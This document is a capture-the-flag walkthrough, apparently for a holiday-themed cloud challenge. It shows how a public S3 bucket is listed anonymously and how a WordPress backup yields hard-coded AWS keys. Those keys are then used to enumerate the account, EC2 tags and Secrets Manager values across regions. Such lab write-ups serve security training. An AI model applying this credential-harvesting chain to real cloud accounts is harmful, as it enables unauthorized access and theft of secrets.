## TASK-1  What is the name of the S3 Bucket used to host the HR Website announcement? 

There is the image given try to view the image location and there you will see the bucket name<br>
```https://s3.amazonaws.com/images.REDACTED.com/flyer.png```

## TASK-2 What is the message left in the flag.txt object from that bucket?

Try to change the link from <b>flyer.png</b> to <b>flag.txt</b> and there you have the contents of the file.<br>
```It's easy to get REDACTED when you leave it so easy to find!```

## TASK-3 What other file in that bucket looks interesting to you?

Using the aws-cli try to list the contents of the bucket using the command
```aws s3 ls s3://images.bestfestivalcompany.com/ --no-sign-request```. ```wp-backup.zip``` file seems to be intresting.

## TASK-4 What is the AWS Access Key ID in that file?

Unzip the zip file and cat the contents of wp-config.php and there you have the ACCESS ID KEY in the buttom.
```bash
/* Add any custom values between this line and the "stop editing" line. */
define('S3_UPLOADS_BUCKET', 'images.bestfestivalcompany.com');
define('S3_UPLOADS_KEY', 'AKIAQIREDACTEDXFYAOI');
define('S3_UPLOADS_SECRET', 'Y+2fQBoJ+X9N0GzREDACTED/KcYxkS1Qmc');
define('S3_UPLOADS_REGION', 'us-east-1');

```

## TASK-5 What is the AWS Account ID that access-key works for?

Run this command ```aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI --profile test```. you will create a test profile using the access key
and get the account id.
```bash
{
    "Account": "019REDACTED6"
}
```

## TASK-6 What is the Username for that access-key?

Run this command ```aws sts get-caller-identity --profile test``` and you will get the username for that access key.
```bash
{
    "UserId": "REDACTED",
    "Account": "REDACTED",
    "Arn": "arn:aws:iam::019181489476:user/REDACTED@bfc.com"
}
```

## TASK-7 There is an EC2 Instance in this account. Under the TAGs, what is the Name of the instance?

Run this command ```aws ec2 describe-instances --output text --profile test``` and under the tags you will see the name of the EC2-Instance.
```bash
SNIP!
TAGS    aws:cloudformation:logical-id   Instance
TAGS    created_by
TAGS    aws:cloudformation:stack-name   REDACTED
TAGS    Name    REDACTED
SNIP!
```

## TASK-8 What is the database password stored in Secrets Manager?

Run these commands to get all the secrets of the secrets manager.
```
aws secretsmanager list-secrets --profile test
aws secretsmanager get-secret-value --secret-id "NAME_VALUE_OF_ABOVE_CMD" --profile test
>> OUTPUT
{
    "ARN": "arn:aws:secretsmanager:us-east-1:019181489476:secret:REDACTED-8AkWYF",
    "Name": "REDACTED",
    "VersionId": "70630b3c-4fbe-4a24-885d-18445bd808b1",
    "SecretString": "The Secret you're looking for is not in this **REGION**. Santa wants to have low latency to his databases. Look closer to where he lives.",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2021-11-24T07:14:07.718000+05:45"
    
```
Try to set the region to other regions and after few attemps you will end up with ```eu-north-1``` So the final command is
```
aws secretsmanager get-secret-value --secret-id "NAME_VALUE" --profile test --region "eu-north-1"
```

<h3><b>That's it for Day-17. Happy Hacking!</h3></b>
